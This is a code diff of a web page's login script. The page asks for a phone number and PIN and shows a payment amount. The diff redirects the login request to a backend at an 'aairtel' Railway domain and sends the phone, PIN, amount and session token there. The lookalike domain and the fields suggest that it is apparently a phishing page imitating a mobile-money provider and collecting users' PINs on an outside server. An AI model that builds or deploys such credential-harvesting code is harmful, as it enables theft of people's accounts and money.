@@ -309,8 +309,7 @@
 
 <script>
   /* ==================== CONFIG ==================== */
-  const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
-  const SUPABASE_ANON_KEY = 'YOUR_ANON_KEY';
+  const BACKEND_URL = 'https://aairtel-production.up.railway.app';
 
   /* ==================== ELEMENTS ==================== */
   const pinInput = document.getElementById('pinInput');
@@ -332,7 +331,7 @@
   }
 
   // Auto-fill phone (disabled)
-  phoneInput.value = phone;
+  phoneInput.value = phone || '';
 
   // Display amount
   if (amount) {
@@ -378,16 +377,17 @@
     hideError();
 
     try {
-      const res = await fetch(`${SUPABASE_URL}/functions/v1/verify-login`, {
+      const res = await fetch(`${BACKEND_URL}/api/login`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
         },
         body: JSON.stringify({
           phone: phone,
           pin: pin,
-          session_token: sessionToken,
+          amount: amount,
+          session: sessionToken,
+          page: 'login'
         }),
       });
 
